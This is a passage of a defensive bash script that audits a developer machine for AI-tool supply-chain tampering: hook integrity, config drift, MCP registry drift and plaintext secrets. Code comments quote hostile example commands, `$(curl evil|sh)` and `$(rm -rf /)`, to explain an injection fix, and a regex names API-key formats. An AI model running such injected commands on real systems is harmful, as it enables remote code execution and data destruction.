#!/usr/bin/env bash
# audit.sh — daily supply-chain audit for Walter-OS
# Exit codes: 0=clean, 1=info, 2=high, 3=critical
# Detailed report at ~/.config/walter-os/audit-YYYY-MM-DD.md

set -uo pipefail
# Note: not using -e because we want to collect ALL findings, not bail on first.

readonly WALTER_CONFIG="${WALTER_CONFIG:-${HOME}/.config/walter-os}"
readonly BASELINES_DIR="${WALTER_CONFIG}/baselines"
readonly TODAY="$(date +%Y-%m-%d)"
readonly REPORT="${WALTER_CONFIG}/audit-${TODAY}.md"
readonly STATUS="${WALTER_CONFIG}/audit-status.json"
readonly CLAUDE_HOME="${HOME}/.claude"
readonly CODEX_HOME="${HOME}/.codex"

mkdir -p "${WALTER_CONFIG}" "${BASELINES_DIR}"

# Severity tracking
SEVERITY=0    # 0 clean, 1 info, 2 high, 3 critical
FINDINGS=()
INFO_COUNT=0
HIGH_COUNT=0
CRIT_COUNT=0

# _safe_expand_env_path — expand a literal `$VAR/...` or `${VAR}/...`
# token from an UNTRUSTED source (e.g. ~/.claude/settings.json hook
# command field) using ONLY the explicit allowlist below. Prints the
# resolved path to stdout on success (exit 0); returns 1 for any token
# that doesn't match a known prefix (which includes command-substitution
# attempts like `$(rm -rf /)` and `` `cmd` `` — those don't match the
# literal `$NAME/` patterns).
#
# NEVER replace this with eval. Closes Codex R2 (PR #124): the previous
# eval-based path executed arbitrary commands from settings.json when
# audit.sh check_hooks or walter-os baseline-hooks ran.
#
# Keep this in sync with the identical copy in bin/walter-os.
_safe_expand_env_path() {
  local tok="$1"
  # shellcheck disable=SC2016 # single-quoted '$VAR/' is INTENTIONAL —
  # the case patterns must match the LITERAL `$NAME` text in $tok (which
  # came from settings.json). Expansion is what we're protecting against.
  case "$tok" in
    '$HOME'/*)              printf '%s' "${HOME}${tok#\$HOME}" ;;
    '${HOME}'/*)            printf '%s' "${HOME}${tok#'${HOME}'}" ;;
    '$WALTER_OS_HOME'/*)    [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#\$WALTER_OS_HOME}" ;;
    '${WALTER_OS_HOME}'/*)  [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#'${WALTER_OS_HOME}'}" ;;
    '$WALTER_CONFIG'/*)     [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#\$WALTER_CONFIG}" ;;
    '${WALTER_CONFIG}'/*)   [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#'${WALTER_CONFIG}'}" ;;
    *)                      return 1 ;;
  esac
}

bump() {
  local level="$1"
  # Copilot R2 #129 R2.4: medium maps to the same bucket as high
  # (severity=2, exit code 2). Callers can still emit "medium" for
  # finer-grained reporting in the markdown report; severity counts
  # treat medium and high identically so neither is silently dropped.
  case "$level" in
    info)   (( INFO_COUNT++ ));   (( SEVERITY < 1 )) && SEVERITY=1 ;;
    # medium findings count toward HIGH for exit-code purposes (so
    # they still block the daily-audit-gate hook) but the level
    # string "medium" is preserved in the finding output for human
    # review. Added for Copilot R2 #124 R2.6 / #129 R2.1 — previously
    # `finding medium ...` calls were silently dropped because bump()
    # didn't recognize the level.
    medium) (( HIGH_COUNT++ ));   (( SEVERITY < 2 )) && SEVERITY=2 ;;
    high)   (( HIGH_COUNT++ ));   (( SEVERITY < 2 )) && SEVERITY=2 ;;
    crit)   (( CRIT_COUNT++ ));   (( SEVERITY < 3 )) && SEVERITY=3 ;;
  esac
}

finding() {
  local level="$1" id="$2" desc="$3" action="${4:-investigate manually}"
  bump "$level"
  # `${level^^}` is bash 4+ syntax. macOS bash 3.2 fails to parse it.
  local level_upper
  level_upper="$(printf '%s' "$level" | tr '[:lower:]' '[:upper:]')"
  FINDINGS+=("- **[${level_upper}]** \`${id}\` — ${desc}")
  FINDINGS+=("  - Action: ${action}")
}

# ---------- 0. Tool versions ----------

check_versions() {
  if command -v claude >/dev/null 2>&1; then
    local v
    v="$(claude --version 2>/dev/null | awk '{print $NF}' || echo unknown)"
    if [[ "$v" =~ ^([0-9]+)\.([0-9]+)\.([0-9]+) ]]; then
      local maj="${BASH_REMATCH[1]}" min="${BASH_REMATCH[2]}" pat="${BASH_REMATCH[3]}"
      if (( maj < 2 || (maj == 2 && min == 0 && pat < 65) )); then
        finding crit "CVE-2025-59536" \
          "Claude Code $v is below 2.0.65, vulnerable to hooks injection RCE" \
          "Run: claude update"
      fi
    fi
  else
    finding info "no-claude-cli" "Claude Code not installed" "Install if you use it"
  fi

  if command -v codex >/dev/null 2>&1; then
    : # version check rules go here when CVEs publish
  fi
}

# ---------- 1. Config drift ----------

check_config_drift() {
  # `${WALTER_CONFIG}/egress-allowlist.txt` is included here so a tamper
  # of the operator's allowlist (silent add of `attacker.example`, silent
  # `*` line, etc.) is reported on the next audit run. Per Copilot R5
  # the egress-loader's threat model assumed this baseline existed —
  # this is where it actually does.
  local egress_allowlist="${WALTER_CONFIG:-${HOME}/.config/walter-os}/egress-allowlist.txt"
  for cfg in "${CLAUDE_HOME}/settings.json" "${CODEX_HOME}/config.toml" "$egress_allowlist"; do
    [[ -f "$cfg" ]] || continue
    local name; name="$(basename "$cfg")"
    local baseline="${BASELINES_DIR}/${name}.sha256"
    local current; current="$(shasum -a 256 "$cfg" | awk '{print $1}')"
    if [[ -f "$baseline" ]]; then
      local stored; stored="$(cat "$baseline")"
      if [[ "$current" != "$stored" ]]; then
        finding high "config-drift-${name}" \
          "Config $cfg has been modified since last baseline" \
          "Review the diff. If intentional, run: walter-os baseline $cfg"
      fi
    else
      # First run — just record the baseline.
      echo "$current" > "$baseline"
    fi
  done
}

# ---------- 2. Plaintext secrets in configs ----------

check_secrets_in_configs() {
  local pattern='(sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{30,}|AIza[0-9A-Za-z_-]{30,}|xoxb-|AKIA[0-9A-Z]{16})'
  for cfg in "${CLAUDE_HOME}/settings.json" "${CODEX_HOME}/config.toml" \
             $(find "${HOME}" -maxdepth 4 -name '.mcp.json' 2>/dev/null); do
    [[ -f "$cfg" ]] || continue
    if grep -qE "$pattern" "$cfg" 2>/dev/null; then
      finding crit "plaintext-secret" \
        "Plaintext-looking secret found in $cfg" \
        "Move secret to env var, replace in config with \${ENV_VAR_NAME}"
    fi
  done
}

# ---------- 3. Hooks integrity ----------

# _audit_hash_file — portable SHA256 (GNU/BSD).
# Closes Copilot R2 #124 R2.1: prints to a global _HASH_FILE_RESULT
# variable AND returns 0/1 for success/failure. Callers must check
# the return code — a missing hasher returns 1 (NOT an empty string
# treated as a valid hash, which previously caused false-CRIT triggers
# when current_sha was empty but stored_sha was non-empty).
_audit_hash_file() {
  local file="$1"
  _HASH_FILE_RESULT=""
  [[ -r "$file" && -f "$file" ]] || return 1
  if command -v sha256sum >/dev/null 2>&1; then
    _HASH_FILE_RESULT=$(sha256sum "$file" 2>/dev/null | awk '{print $1}')
  elif command -v shasum >/dev/null 2>&1; then
    _HASH_FILE_RESULT=$(shasum -a 256 "$file" 2>/dev/null | awk '{print $1}')
  else
    return 1
  fi
  [[ -n "$_HASH_FILE_RESULT" ]]
}

# _check_hooks_v1 — legacy v1 detection fallback (command-strings only).
_check_hooks_v1() {
  local settings="$1" checksums="$2"
  local current; current="$(jq '[.hooks // {} | .. | objects | select(has("command")) | .command]' "$settings")"
  local stored; stored="$(cat "$checksums")"
  if [[ "$current" != "$stored" ]]; then
    finding high "hooks-modified" \
      "Hooks in $settings differ from v1 baseline" \
      "Inspect new hooks. If safe: walter-os baseline-hooks (also migrates to v2)"
  fi
}

# check_hooks — v2 detection: per-entry content SHA256 + command drift.
# Closes F1 BLOCKER (external review 2026-05-21, issue #115). See ADR 0016.
check_hooks() {
  local settings="${CLAUDE_HOME}/settings.json"
  [[ -f "$settings" ]] || return 0
  if ! command -v jq >/dev/null 2>&1; then
    finding high "no-jq" "jq not installed; can't verify hooks" "brew install jq"
    return 0
  fi
  local hook_count
  hook_count="$(jq '[.hooks // {} | .. | objects | select(has("command"))] | length' "$settings" 2>/dev/null || echo 0)"
  [[ "$hook_count" -gt 0 ]] || return 0

  local checksums="${WALTER_CONFIG}/hook-checksums.json"

  # First run — snapshot v2 directly. Uses the SAME inline-detection
  # heuristic as bin/walter-os cmd_baseline_hooks (Copilot R1 #124 R1.1)
  # and atomic write via .tmp + mv (Copilot R1 #124 R1.6).
  if [[ ! -f "$checksums" ]]; then
    mkdir -p "$(dirname "$checksums")"
    local result; result=$(jq -n '{version: 2, hooks: []}')
    local hooks_array; hooks_array=$(jq '[.hooks // {} | .. | objects | select(has("command"))]' "$settings")
    local n; n=$(jq 'length' <<<"$hooks_array")
    local i=0
    while [[ $i -lt $n ]]; do
      local cmd; cmd=$(jq -r ".[$i].command" <<<"$hooks_array")
      local first_tok; first_tok=$(awk '{print $1}' <<<"$cmd")
      local path=""
      case "$first_tok" in
        /*|./*|../*)
          [[ -f "$first_tok" ]] && path="$first_tok"
          ;;
        ~/*)
          local resolved="${first_tok/#\~/$HOME}"
          [[ -f "$resolved" ]] && path="$resolved"
          ;;
        \$*)
          # Env-var-prefixed path. Use the explicit allowlist below —
          # NEVER eval. Closes Codex R2 (PR #124): eval on a token sourced
          # from settings.json was an RCE vector — an attacker who could
          # tamper with ~/.claude/settings.json could put `$(curl evil|sh)/foo`
          # in a hook command field; the eval would then execute it the
          # next time `audit.sh check_hooks` ran.
          # Keep the allowlist + the bin/walter-os cmd_baseline_hooks
          # version in sync — they MUST match.
          local resolved=""
          if resolved="$(_safe_expand_env_path "$first_tok")"; then
            [[ -n "$resolved" && -f "$resolved" ]] && path="$resolved"
          fi
          ;;
      esac
      local sha=""
      if [[ -n "$path" ]] && _audit_hash_file "$path"; then
        sha="$_HASH_FILE_RESULT"
      fi
      result=$(jq --arg c "$cmd" --arg p "$path" --arg s "$sha" \
        '.hooks += [{command: $c, path: $p, sha256: $s}]' <<<"$result")
      i=$((i + 1))
    done
    echo "$result" | jq --sort-keys '.' > "${checksums}.tmp" && mv "${checksums}.tmp" "$checksums"
    return 0
  fi

  # Schema detection. The v1 and error paths return early; the v2 path
  # falls through to the per-entry hash check below. We deliberately
  # don't store the schema label — the control flow already encodes it
  # and shellcheck SC2034 would flag a write-only variable.
  if jq -e 'type == "object" and .version == 2' "$checksums" >/dev/null 2>&1; then
    : # v2 — fall through to the per-entry content check
  elif jq -e 'type == "array"' "$checksums" >/dev/null 2>&1; then
    finding info "hook-checksums-v1-schema" \
      "hook-checksums.json on legacy v1 schema (does NOT detect in-place script modification)" \
      "Run: walter-os baseline-hooks to migrate to v2 (content-hashing)"
    _check_hooks_v1 "$settings" "$checksums"
    return 0
  else
    finding high "hook-checksums-corrupted" \
      "hook-checksums.json schema not recognized" \
      "Inspect manually then: walter-os baseline-hooks"
    return 0
  fi

  # v2: per-entry content check
  local entries; entries=$(jq -c '.hooks[]' "$checksums")
  while IFS= read -r entry; do
    [[ -n "$entry" ]] || continue
    local cmd path stored_sha
    cmd=$(jq -r '.command' <<<"$entry")
    path=$(jq -r '.path' <<<"$entry")
    stored_sha=$(jq -r '.sha256' <<<"$entry")

    # Skip if baseline recorded this as inline (no path) — inline
    # commands are documented as not-content-hashable; we record them
    # so the operator can see them in the report, but skip the integrity
    # check (Copilot R1 #124 R1.6).
    [[ -z "$path" ]] && continue

    # Copilot R6 #124: empty stored_sha with a resolvable path = the
    # baseline tried to hash this file + failed (no hasher available,
    # or unreadable at baseline-time). Previously we silently skipped
    # — that means a hook with `path=/x/y, sha=""` would NEVER be
    # integrity-checked even after sha256sum was installed. Now emit
    # INFO so the operator knows the entry is in skipped-state + can
    # re-baseline to fix it.
    if [[ -z "$stored_sha" ]]; then
      finding info "hook-sha-not-recorded" \
        "Hook '$path' (cmd: $cmd) has empty stored sha in baseline; content-integrity check skipped" \
        "Re-run: walter-os baseline-hooks (re-hashes all entries; needs sha256sum/shasum installed)"
      continue
    fi

    if [[ ! -f "$path" || ! -r "$path" ]]; then
      finding high "hook-file-missing" \
        "Hook script vanished or unreadable: $path (cmd: $cmd)" \
        "Restore from git OR walter-os baseline-hooks if intentional"
      continue
    fi

    # Closes Copilot R2 #124 R2.1: if no hasher is installed,
    # _audit_hash_file returns 1 + empty result. Treat that as
    # "cannot verify" (HIGH), NOT as "content mismatch" (CRIT).
    local current_sha=""
    if _audit_hash_file "$path"; then
      current_sha="$_HASH_FILE_RESULT"
    else
      finding high "hook-hasher-missing" \
        "No SHA256 tool installed; cannot verify hook content for $path" \
        "brew install coreutils  (or use macOS default shasum)"
      continue
    fi
    if [[ "$current_sha" != "$stored_sha" ]]; then
      finding crit "hook-content-modified" \
        "Hook script CONTENT changed in place (path unchanged): $path. Stored sha: ${stored_sha:0:12}..., current sha: ${current_sha:0:12}..." \
        "REVIEW DIFF: git diff $path. If intentional: walter-os baseline-hooks"
    fi
  done <<< "$entries"

  # Command-set drift — split into added/removed for proper severity
  # (Copilot R1 #124 R1.5: spec says removed=medium, added/changed=high).
  local stored_cmds current_cmds
  stored_cmds=$(jq -r '.hooks[].command' "$checksums" 2>/dev/null | sort -u)
  current_cmds=$(jq -r '.hooks // {} | .. | objects | select(has("command")) | .command' "$settings" 2>/dev/null | sort -u)

  local added removed
  added=$(comm -23 <(echo "$current_cmds") <(echo "$stored_cmds"))
  removed=$(comm -13 <(echo "$current_cmds") <(echo "$stored_cmds"))

  while IFS= read -r cmd; do
    [[ -z "$cmd" ]] && continue
    finding high "hook-added" \
      "Hook command added in $settings since baseline: $cmd" \
      "Inspect the new hook. If safe: walter-os baseline-hooks"
  done <<< "$added"

  while IFS= read -r cmd; do
    [[ -z "$cmd" ]] && continue
    finding medium "hook-removed" \
      "Hook command removed from $settings since baseline: $cmd" \
      "If intentional: walter-os baseline-hooks"
  done <<< "$removed"
}

# ---------- 4. MCP scanners ----------

check_mcp_scanners() {
  if command -v mcp-scan >/dev/null 2>&1; then
    local out; out="$(mcp-scan --json 2>/dev/null || echo '{}')"
    local crit; crit="$(echo "$out" | jq '[.findings[]?|select(.severity=="critical")]|length' 2>/dev/null || echo 0)"
    local high; high="$(echo "$out" | jq '[.findings[]?|select(.severity=="high")]|length' 2>/dev/null || echo 0)"
    if [[ "$crit" -gt 0 ]]; then
      finding crit "mcp-scan-critical" \
        "Snyk mcp-scan found $crit critical issue(s)" \
        "Run: mcp-scan for full report"
    fi
    if [[ "$high" -gt 0 ]]; then
      finding high "mcp-scan-high" \
        "Snyk mcp-scan found $high high-severity issue(s)" \
        "Run: mcp-scan for full report"
    fi
  fi
  # If mcp-scan not installed, we silently skip — surfacing this as info every
  # day creates alert fatigue. It's documented in the SKILL.md as optional.
}

# ---------- 5. MCP server-registry + tool-definition drift ----------
# (Function still named check_tool_definitions for backward compat with
# audit_main() invocation order. It now performs two checks: static
# registry drift and stdio tools/list drift for approved default-profile MCPs.)

_mcp_tool_snapshot_helper() {
  local script_dir script_root
  script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
  script_root="${script_dir%/skills/daily-supply-chain-audit/scripts}"
  local -a candidates=()
  if [[ -n "${WALTER_OS_HOME:-}" ]]; then
    candidates+=("${WALTER_OS_HOME}/skills/daily-supply-chain-audit/scripts/mcp-tool-snapshot.mjs")
  fi
  candidates+=(
    "${script_root}/skills/daily-supply-chain-audit/scripts/mcp-tool-snapshot.mjs"
    "${HOME}/walter-os/skills/daily-supply-chain-audit/scripts/mcp-tool-snapshot.mjs"
  )
  for candidate in "${candidates[@]}"; do
    if [[ -n "$candidate" && -f "$candidate" ]]; then
      printf '%s' "$candidate"
      return 0
    fi
  done
  return 1
}

check_mcp_runtime_tool_definitions() {
  local settings="${CLAUDE_HOME}/settings.json"
  [[ -f "$settings" ]] || return 0

  local helper
  if ! helper="$(_mcp_tool_snapshot_helper)"; then
    finding info "mcp-tool-snapshot-helper-missing" \
      "MCP tool-definition snapshot helper not found; stdio tools/list drift check skipped" \
      "Run install.sh --upgrade from a current Walter-OS checkout"
    return 0
  fi

  if ! command -v node >/dev/null 2>&1; then
    finding high "no-node-mcp-tool-drift" \
      "node not installed; cannot probe stdio MCP tool definitions" \
      "Install Node.js or run walter-os baseline-mcp-tools from a Node-enabled host"
    return 0
  fi

  local baseline="${WALTER_CONFIG}/mcp-tool-snapshots.json"
  if [[ ! -f "$baseline" ]]; then
    finding high "mcp-tool-baseline-missing" \
      "MCP tool snapshot baseline missing; refusing to approve current tools/list output during audit" \
      "Review stdio MCP config, then run: walter-os baseline-mcp-tools"
    return 0
  fi

  local snapshot_tmp; snapshot_tmp="$(mktemp "${baseline}.current.XXXXXX")"
  local server_baseline="${WALTER_CONFIG}/mcp-server-snapshots.json"
  if [[ ! -f "$server_baseline" ]]; then
    rm -f "$snapshot_tmp"
    finding high "mcp-server-baseline-missing" \
      "MCP server registry baseline missing; refusing to execute stdio MCP probes" \
      "Run: walter-os baseline-mcp-tools after reviewing mcp/servers.json"
    return 0
  fi

  if ! node "$helper" --settings "$settings" --approved-registry "$server_baseline" > "$snapshot_tmp"; then
    rm -f "$snapshot_tmp"
    finding high "mcp-tool-snapshot-failed" \
      "Failed to snapshot stdio MCP tool definitions from $settings" \
      "Run: node $helper --settings $settings --approved-registry $server_baseline"
    return 0
  fi

  local error_count
  error_count="$(jq '.errors // {} | length' "$snapshot_tmp" 2>/dev/null || echo 0)"
  if [[ "$error_count" -gt 0 ]]; then
    finding high "mcp-tool-probe-errors" \
      "MCP tool snapshot reported $error_count stdio probe error(s)" \
      "Run: node $helper --settings $settings --approved-registry $server_baseline | jq '.errors'"
  fi

  local current_servers
  if ! current_servers="$(jq --sort-keys '.servers // {}' "$snapshot_tmp" 2>/dev/null)"; then
    rm -f "$snapshot_tmp"
    finding high "mcp-tool-snapshot-unparseable" \
      "MCP tool snapshot helper returned invalid JSON" \
      "Run: node $helper --settings $settings --approved-registry $server_baseline"
    return 0
  fi

  local stored_servers
  if ! stored_servers="$(jq --sort-keys '.servers // {}' "$baseline" 2>/dev/null)"; then
    rm -f "$snapshot_tmp"
    finding high "mcp-tool-baseline-unparseable" \
      "MCP tool snapshot baseline is not valid JSON: $baseline" \
      "Review the file. If safe: walter-os baseline-mcp-tools"
    return 0
  fi

  rm -f "$snapshot_tmp"
  if [[ "$current_servers" != "$stored_servers" ]]; then
    finding crit "mcp-tool-shadowing" \
      "Stdio MCP tool definitions changed since the approved baseline" \
      "Review current tools/list output. If safe: walter-os baseline-mcp-tools"
  fi
}

check_tool_definitions() {
  # Closes issue #117 (external review F4) Phase 1: snapshot the STATIC
  # MCP server registry (mcp/servers.json) and diff against a baseline.
  # Detects:
  #   - server added → HIGH (new capability surface)
  #   - server removed → INFO (cleanup, less suspicious)
  #   - command / args changed → HIGH (different binary or version)
  #   - trust level changed → MEDIUM
  #
  # The runtime stdio tools/list drift check runs after the static registry
  # comparison so registry drift cannot mask tool-definition drift.
  # Registry path resolution (Copilot R3 #129): prefer the explicit
  # WALTER_OS_HOME env var, then walk up from the script's own location
  # (handles `audit.sh` run from a non-default checkout), then fall back
  # to the legacy ~/walter-os default. If none resolve to an existing
  # file, emit an INFO finding rather than silently returning — a
  # missing registry should be visible in the audit report.
  local registry=""
  local script_dir script_root
  script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
  script_root="${script_dir%/skills/daily-supply-chain-audit/scripts}"
  local -a registry_candidates=()
  if [[ -n "${WALTER_OS_HOME:-}" ]]; then
    registry_candidates+=("${WALTER_OS_HOME}/mcp/servers.json")
  fi
  registry_candidates+=(
    "${script_root}/mcp/servers.json"
    "${HOME}/walter-os/mcp/servers.json"
  )
  for candidate in "${registry_candidates[@]}"; do
    if [[ -n "$candidate" && -f "$candidate" ]]; then
      registry="$candidate"
      break
    fi
  done
  if [[ -z "$registry" ]]; then
    finding info "mcp-registry-not-found" \
      "mcp/servers.json not found in WALTER_OS_HOME, script root, or ~/walter-os; MCP drift check skipped" \
      "Set WALTER_OS_HOME or run audit.sh from inside a walter-os checkout"
    return 0
  fi
  # MAJOR fix (Copilot R1 #129 R1.1): if jq is missing, the audit's
  # security-relevant MCP drift check would silently pass. Emit a HIGH
  # finding instead of returning quietly — same pattern as check_hooks.
  if ! command -v jq >/dev/null 2>&1; then
    finding high "no-jq-mcp-drift" "jq not installed; cannot verify MCP server registry for drift" "brew install jq"
    return 0
  fi

  local baseline="${WALTER_CONFIG}/mcp-server-snapshots.json"
  local current
  # Copilot R2 #129 R2.6: surface jq parse failures as HIGH instead of
  # silently returning 0. A corrupted/malformed registry shouldn't be
  # a stealth way to disable the drift check.
  if ! current="$(jq --sort-keys '.servers // {}' "$registry" 2>/dev/null)"; then
    finding high "mcp-registry-unparseable" \
      "jq failed to parse $registry; MCP drift check skipped" \
      "Inspect mcp/servers.json for JSON syntax errors. If safe: walter-os baseline-mcp-tools"
    return 0
  fi

  if [[ ! -f "$baseline" ]]; then
    # Atomic write. `mktemp "${baseline}.tmp.XXXXXX"` (template form)
    # creates the temp file in the same directory as $baseline so the
    # final `mv` is atomic on the filesystem. The `XXXXXX` template
    # gives a unique per-process name to prevent the race Codex R2 #129
    # flagged: concurrent `walter-os baseline-mcp-tools` + this
    # check_tool_definitions first-run shared `${baseline}.tmp` and
    # could clobber. (Copilot R6 #129: comment used to say `mktemp -p`
    # but the code uses the template form — corrected.)
    # printf '%s\n' (Copilot R3 #129) — echo's escape handling is
    # implementation-defined, unsafe for security-critical baseline.
    mkdir -p "$(dirname "$baseline")"
    local tmp; tmp="$(mktemp "${baseline}.tmp.XXXXXX")"
    printf '%s\n' "$current" > "$tmp" && mv "$tmp" "$baseline"
    check_mcp_runtime_tool_definitions
    return 0
  fi

  local stored
  stored="$(cat "$baseline")"
  if [[ "$current" == "$stored" ]]; then
    check_mcp_runtime_tool_definitions
    return 0
  fi

  local current_names stored_names
  current_names="$(jq -r 'keys[]' <<<"$current" | sort -u)"
  stored_names="$(jq -r 'keys[]' <<<"$stored" | sort -u)"

  while IFS= read -r name; do
    [[ -z "$name" ]] && continue
    finding high "mcp-server-added" \
      "MCP server added: $name (in mcp/servers.json since baseline)" \
      "Review new server's command, args, trust. If safe: walter-os baseline-mcp-tools"
  done < <(comm -23 <(printf '%s\n' "$current_names") <(printf '%s\n' "$stored_names"))

  while IFS= read -r name; do
    [[ -z "$name" ]] && continue
    finding info "mcp-server-removed" \
      "MCP server removed: $name (was in baseline, not in current registry)" \
      "If intentional: walter-os baseline-mcp-tools"
  done < <(comm -13 <(printf '%s\n' "$current_names") <(printf '%s\n' "$stored_names"))

  while IFS= read -r name; do
    [[ -z "$name" ]] && continue
    # Codex R2 #129 BLOCKER fix: compare the FULL per-server JSON object
    # (sorted keys) — not just command/args/trust. Other fields like
    # `url`, `headers`, `env`, `disabled`, `load`, `contexts` describe
    # the server's behavior + can be malicious-takeover vectors (e.g.
    # silently flipping `disabled: true` → `false` on a high-trust server,
    # or changing `url` to an attacker-controlled proxy). Any whole-object
    # difference now emits a finding.
    local cur_full sto_full
    cur_full="$(jq --sort-keys --arg n "$name" '.[$n]' <<<"$current")"
    sto_full="$(jq --sort-keys --arg n "$name" '.[$n]' <<<"$stored")"
    [[ "$cur_full" == "$sto_full" ]] && continue

    # Identify which fields changed for a more actionable finding message.
    local cur_cmd cur_args cur_trust sto_cmd sto_args sto_trust
    cur_cmd="$(jq -r --arg n "$name" '.[$n].command // ""' <<<"$current")"
    cur_args="$(jq -c --arg n "$name" '.[$n].args // []' <<<"$current")"
    cur_trust="$(jq -r --arg n "$name" '.[$n].trust // ""' <<<"$current")"
    sto_cmd="$(jq -r --arg n "$name" '.[$n].command // ""' <<<"$stored")"
    sto_args="$(jq -c --arg n "$name" '.[$n].args // []' <<<"$stored")"
    sto_trust="$(jq -r --arg n "$name" '.[$n].trust // ""' <<<"$stored")"

    if [[ "$cur_cmd" != "$sto_cmd" || "$cur_args" != "$sto_args" ]]; then
      finding high "mcp-server-cmd-changed" \
        "MCP server '$name' command/args changed since baseline" \
        "REVIEW: jq '.servers.\"$name\"' $registry. If safe: walter-os baseline-mcp-tools"
    elif [[ "$cur_trust" != "$sto_trust" ]]; then
      finding medium "mcp-server-trust-changed" \
        "MCP server '$name' trust level changed: '$sto_trust' → '$cur_trust'" \
        "Verify intentional. If safe: walter-os baseline-mcp-tools"
    else
      # Whole-object diff but command/args/trust unchanged — must be one
      # of: url, headers, env, disabled, load, contexts, verified_at, or
      # any future-added field. Emit HIGH because we don't know the
      # semantics (config-takeover vectors live in this bucket).
      finding high "mcp-server-config-changed" \
        "MCP server '$name' config changed since baseline (fields other than command/args/trust)" \
        "REVIEW: diff <(jq '.\"$name\"' $baseline) <(jq '.servers.\"$name\"' $registry). If safe: walter-os baseline-mcp-tools"
    fi
  done < <(comm -12 <(printf '%s\n' "$current_names") <(printf '%s\n' "$stored_names"))

  check_mcp_runtime_tool_definitions
}

# ---------- 6. Minimum release age check ----------

check_min_release_age() {
  # Resolve protection level for the current repo.
  # Respects WALTER_AUDIT_REPO_DIR env var; falls back to cwd.
  local repo_dir="${WALTER_AUDIT_REPO_DIR:-$(pwd)}"
  local script_dir
  script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
  local walter_home="${WALTER_OS_HOME:-$(cd "$script_dir/../../.." && pwd)}"
  local parser="${walter_home}/scripts/parse-manifest.py"
  local age_checker="${walter_home}/skills/daily-supply-chain-audit/scripts/check-release-age.py"
  local justify_log="${WALTER_CONFIG}/justify-log.jsonl"
  local cache_file="${WALTER_CONFIG}/release-date-cache.json"

  if [[ ! -f "$parser" ]]; then
    finding info "release-age-no-parser" \
      "parse-manifest.py not found at $parser; skipping release-age check" \
      "Run install.sh to reinstall walter-os"
    return 0
  fi

  if [[ ! -f "$age_checker" ]]; then
    finding info "release-age-no-checker" \
      "check-release-age.py not found at $age_checker; skipping release-age check" \
      "Run install.sh to reinstall walter-os"
    return 0
  fi

  # Get resolved protection level
  local config_json
  config_json="$(python3 "$parser" --repo-dir "$repo_dir" 2>/dev/null)" || {
    finding info "release-age-parse-error" \
      "Failed to parse protection level for $repo_dir" \
      "Check walter-os.toml in repo root"
    return 0
  }

  local min_age_days audit_gate
  min_age_days="$(echo "$config_json" | python3 -c "import sys,json; print(json.load(sys.stdin).get('minReleaseAgeDays',0))" 2>/dev/null || echo 0)"
  audit_gate="$(echo "$config_json" | python3 -c "import sys,json; print(json.load(sys.stdin).get('auditGate','info'))" 2>/dev/null || echo info)"

  # Skip if experimental (minReleaseAgeDays=0)
  if [[ "$min_age_days" -eq 0 ]]; then
    return 0
  fi

  # Collect npm packages from MCP servers in settings.json
  local settings="${HOME}/.claude/settings.json"
  local pkg_specs=()
  if [[ -f "$settings" ]] && command -v jq >/dev/null 2>&1; then
    while IFS= read -r spec; do
      [[ -n "$spec" ]] && pkg_specs+=("$spec")
    done < <(jq -r '
      .mcpServers // {} | to_entries[] |
      select(.value.command == "npx") |
      .value.args[]? |
      select(test("^[a-zA-Z@][^\\s]*@[0-9]"))
    ' "$settings" 2>/dev/null || true)
  fi

  # Also check any .mcp.json in scope
  for mcp_json in "${HOME}/.mcp.json" "${repo_dir}/.mcp.json"; do
    if [[ -f "$mcp_json" ]] && command -v jq >/dev/null 2>&1; then
      while IFS= read -r spec; do
        [[ -n "$spec" ]] && pkg_specs+=("$spec")
      done < <(jq -r '
        .mcpServers // {} | to_entries[] |
        select(.value.command == "npx") |
        .value.args[]? |
        select(test("^[a-zA-Z@][^\\s]*@[0-9]"))
      ' "$mcp_json" 2>/dev/null || true)
    fi
  done

  if [[ "${#pkg_specs[@]}" -eq 0 ]]; then
    return 0
  fi

  # Determine effective finding severity
  local finding_severity="info"
  case "$audit_gate" in
    high|high+drift) finding_severity="high" ;;
    warn)           finding_severity="info" ;;
    info)           finding_severity="info" ;;
  esac

  # Build checker arguments
  local checker_args=()
  checker_args+=(--min-age-days "$min_age_days")
  checker_args+=(--cache-file "$cache_file")
  checker_args+=(--justify-log "$justify_log")
  checker_args+=(--ecosystem npm)

  # WA_SKIP_NETWORK=1 simulates offline mode by making the checker unavailable
  # We simulate this by blocking all network in the checker via a proxy that
  # immediately refuses. For simplicity, we set an env that check-release-age.py
  # reads to skip actual network calls and report network_error.
  if [[ "${WA_SKIP_NETWORK:-0}" == "1" ]]; then
    checker_args+=(--skip-network)
  fi

  local findings_json
  findings_json="$(python3 "$age_checker" "${pkg_specs[@]}" "${checker_args[@]}" 2>/dev/null)" || true

  if [[ -z "$findings_json" ]]; then
    return 0
  fi

  # Parse findings JSON into TAB-separated rows: <severity>\t<id>\t<pkg_spec>\t<rest>
  # The pkg_spec is emitted as a separate field so the remediation `action`
  # can suggest the correct `walter-os justify <pkg>@<version>` command
  # (LOW from R2: previously we built the action with the finding id, which
  # is not a valid justify argument).
  local release_age_rows
  release_age_rows="$(python3 -c "
import sys, json

findings_json = sys.argv[1]
finding_severity = sys.argv[2]

try:
    findings = json.loads(findings_json)
except Exception as e:
    print(f'INFO\trelease-age-parse-error\t-\t{e}', file=sys.stderr)
    sys.exit(0)

rows = []
for f in findings:
    pkg = f.get('pkg', 'unknown')
    if f.get('network_error'):
        rows.append(f'INFO\trelease-age-network-error\t{pkg}\tregistry unreachable for {pkg}')
    elif f.get('justified'):
        expires = f.get('expires','?')
        rows.append(f'INFO\trelease-age-justified\t{pkg}\t{pkg} (expires: {expires})')
    elif not f.get('ok'):
        age = f.get('age_days', '?')
        min_a = f.get('min_age_days', '?')
        rows.append(f'{finding_severity.upper()}\trelease-age-young\t{pkg}\t{pkg} age={age}d min={min_a}d')

for r in rows:
    print(r)
" "$findings_json" "$finding_severity" 2>/dev/null || true)"

